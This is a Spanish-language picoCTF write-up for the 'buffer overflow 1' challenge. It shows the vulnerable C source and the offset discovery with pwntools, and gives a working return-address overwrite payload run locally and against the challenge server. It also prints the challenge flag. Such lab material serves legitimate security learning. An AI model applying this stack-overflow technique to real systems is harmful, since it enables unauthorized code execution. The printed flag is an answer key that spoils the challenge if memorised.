# buffer overflow 1

## Descripción: 
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using  `nc saturn.picoctf.net 56543`

**Pistas:**
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

## Solución:
1. En este reto se nos dan dos archivos uno es un ejecutable y el otro es el código fuente:  

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ ls
vuln  vuln.c
                                                                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ cat vuln.c          
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ 
```

2. Le damos permisos de ejecución al script y lo ejecutamos:

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ chmod +x vuln
                                                                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 may 13 20:12 .
drwxr-xr-x 6 kali kali  4096 may 13 19:53 ..
-rwxr-xr-x 1 kali kali 15704 mar 15 23:16 vuln
-rw-r--r-- 1 kali kali   769 mar 15 23:16 vuln.c
                                                                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ ./vuln
Please enter your string: 
sdhdfjgkghk
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ 
```

3. Probamos el programa para saber con cuantos caracteres podemos sobrescribir en la pila y obtener la dirección de retorno, con ayuda de Python observamos que con 44 caracteres  podemos sobrescribir la función de retorno: 

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                                                                       
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ 
```

```python
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A' * 44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>>
```

4. Ahora con ayuda de `objdump` obtenemos la dirección de retorno: 

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ objdump -D vuln -M intel | grep "win"
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
                                                                                              
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ 
```

5. Probamos el programa de forma local pasándole lo 44 caracteres y la dirección de retorno invertida: 

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag{dummieflag}
zsh: done                echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | 
zsh: segmentation fault  ./vuln
                                                                                                                                                 
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ 
```

```python
>>> from pwn import *
>>> p32(0x080491f6) # obtener la dirección de retorno invertida
b'\xf6\x91\x04\x08'
>>> xf6
```

6. Ahora lo probamos de forma remota y obtenemos la bandera: 

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" |  nc saturn.picoctf.net 56543
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}                                                                                                                                                 
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/buffer_overflow_1]
└─$
```

### Flag: picoCTF{addr3ss3s_ar3_3asy_a8284f4f} 

## Notas adicionales:

## Referencias:
- https://es.wikipedia.org/wiki/SIGSEGV
- https://www.cs.virginia.edu/~evans/cs216/guides/x86.html